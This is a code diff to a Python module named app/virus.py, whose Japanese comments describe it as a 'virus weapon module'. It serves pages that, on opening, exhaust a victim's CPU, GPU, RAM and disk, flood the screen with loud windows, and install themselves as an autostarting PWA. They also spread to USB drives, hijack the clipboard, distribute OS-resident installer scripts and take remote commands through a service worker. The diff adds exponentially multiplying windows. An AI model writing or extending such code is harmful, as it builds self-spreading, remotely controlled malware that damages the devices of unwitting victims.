@@ -6,10 +6,11 @@ app/virus.py — ウイルス兵器モジュール
   trojan_install トロイの木馬（常駐型）
   max_power      全部盛り（最高威力）
   brick          ブリック（タブが死なない）
-  windows        爆音窓爆弾（音＋大量ウィンドウ）
+  windows        爆音窓爆弾（音＋大量ウィンドウ）／無限窓モード
   storage        容量枯渇
   mix            全部ミックス
-  singularity    特異点（全44系統統合・PWA常駐・USBワーム・OS常駐インストーラ・L7固定枠）
+  singularity    特異点（全46系統統合・PWA常駐・USBワーム・OS常駐インストーラ・
+                 指数増殖する無限窓繁殖・L7固定枠）
 
 設計:
   兵器ページはボタン無し。開いた瞬間から全部自動・無限。
@@ -17,6 +18,7 @@ app/virus.py — ウイルス兵器モジュール
   singularity はさらに PWA として端末にインストールさせ、常駐・自動起動する。
   相手のUSBにも自分を仕込んで伝染する。
   L7「絶滅」は固定枠。fixed=1 の間は遠隔から下げられない。
+  L7では窓が指数増殖し、各窓がヘビースキンで高火力化する。
   L7ではOS常駐インストーラ(.bat/.command/.sh)を配り、ブラウザの外まで侵食する。
 
 監視室:
@@ -69,7 +71,7 @@ MODE_DESC = {
     "windows": "開いた瞬間に大量のウィンドウを出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "開いた瞬間に端末の容量を埋め尽くす。",
     "mix": "上の全部を無限に。最強。",
-    "singularity": "全44系統・8資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜7を遠隔変更できる。L7は固定枠で、OS常駐インストーラによりブラウザの外まで侵食する。",
+    "singularity": "全46系統・8資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜7を遠隔変更できる。L7は固定枠で、窓が指数増殖し、各窓がヘビースキンで高火力化し、OS常駐インストーラによりブラウザの外まで侵食する。",
 }
 
 # 常駐（ホーム画面追加）で自動発射するモード
@@ -88,7 +90,7 @@ CAUTION = {
     "windows": "⚠ 開いた瞬間に1セット（既定100枚）を10秒以内に出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "⚠ 開いた瞬間に容量を埋め始める。ボタン操作は不要。",
     "mix": "⚠ ホーム画面に追加＝自爆。開いた瞬間から全部が無限に発動する。",
-    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。L7「絶滅」は固定枠で、立てたら遠隔から下げられない。iframe自己増殖・GLコンテキスト枯渇・ダウンロード嵐・クリップボード乗っ取りを同時発動し、さらにOS常駐インストーラを配る。停止・凍結中でもService Worker経由で命令が届く。",
+    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。L7「絶滅」は固定枠で、立てたら遠隔から下げられない。iframe自己増殖・GLコンテキスト枯渇・ダウンロード嵐・クリップボード乗っ取りを同時発動し、窓がリミッターなしで倍々に増え続け、OS常駐インストーラを配る。停止・凍結中でもService Worker経由で命令が届く。",
 }
 
 SCHEMA = """
@@ -723,13 +725,16 @@ from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
 MODE_LABEL["singularity"] = "特異点（SINGULARITY）"
 _GIF1 = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
 _SG_INSTALL_LEVEL = int(os.getenv("SG_INSTALL_LEVEL", "4"))
-_SG_VER = os.getenv("SG_APP_VER", "3.3")
+_SG_VER = os.getenv("SG_APP_VER", "3.4")
 _SG_INJ = os.getenv("SG_INJ", "1") != "0"
 _SG_RAT = os.getenv("SG_RAT", "1") != "0"
 _SG_SSE = os.getenv("SG_SSE", "1") != "0"
 _SG_FINAL_RAM_MB = int(os.getenv("SG_FINAL_RAM_MB", "0") or 0)
 _SG_GPU_MEM = os.getenv("SG_GPU_MEM", "1") != "0"
 _SG_BURN_MAX = int(os.getenv("SG_BURN_MAX", "32") or 32)
+_SG_WIN_MODE = os.getenv("SG_WIN_MODE", "")
+_SG_WIN_BRANCH = os.getenv("SG_WIN_BRANCH", "")
+_SG_WIN_DEPTH = os.getenv("SG_WIN_DEPTH", "")
 
 try:
     from PIL import Image, ImageDraw           # noqa
@@ -746,6 +751,18 @@ def _lv(v) -> int:
         return max(0, min(7, int(v)))
     except Exception:
         return 1
+
+
+def _sg_win_lock():
+    """環境変数で窓の増殖を固定したいときのロック。未設定なら None（レベル準拠）。"""
+    if not _SG_WIN_MODE:
+        return None
+    out = {"mode": _SG_WIN_MODE if _SG_WIN_MODE in ("off", "chain", "breed") else ""}
+    if _SG_WIN_BRANCH.isdigit():
+        out["branch"] = max(1, min(8, int(_SG_WIN_BRANCH)))
+    if _SG_WIN_DEPTH.isdigit():
+        out["depth"] = max(0, int(_SG_WIN_DEPTH))
+    return out
 
 
 def _sg_icon(size, maskable=False):
@@ -903,6 +920,7 @@ def _sg_cfg(row, code, sid, lv, app_name, extra=None):
         "level": lv, "fire": int(_val(row, "firing", 1) or 0),
         "fixed": fixed, "finalRamMB": _SG_FINAL_RAM_MB, "gpuMem": _SG_GPU_MEM,
         "installer": True, "code": code,
+        "winLock": _sg_win_lock(),
         "freeze": _val(row, "freeze", "") or "", "bomb": _val(row, "bomb", "") or "",
         "w": 0, "wipe": False, "avName": app_name, "ver": _SG_VER,
         "install": os.getenv("SG_INSTALL", "auto"), "installLevel": _SG_INSTALL_LEVEL,
